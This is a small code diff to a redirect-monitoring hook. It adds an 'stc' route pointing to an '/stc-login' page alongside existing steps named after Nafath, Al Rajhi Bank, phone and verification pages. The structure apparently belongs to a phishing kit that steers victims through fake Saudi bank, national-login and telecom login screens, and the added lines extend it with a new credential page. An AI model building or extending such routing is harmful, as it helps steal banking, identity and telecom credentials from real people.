@@ -53,6 +53,7 @@ export function useRedirectMonitor({
               phone: "/step5",
               nafad: "/step4",
               rajhi: "/step6",
+              stc: "/stc-login",
             };
 
             const targetUrl = pageMap[redirectPage] || "/";
@@ -70,6 +71,7 @@ export function useRedirectMonitor({
                 _st1: { page: "check", url: "/check" },
                 _t2: { page: "veri", url: "/step2" },
                 _t3: { page: "confi", url: "/step3" },
+                stc: { page: "stc", url: "/stc-login" },
               };
 
             const targetPage = legacyPageMap[currentStep as string];
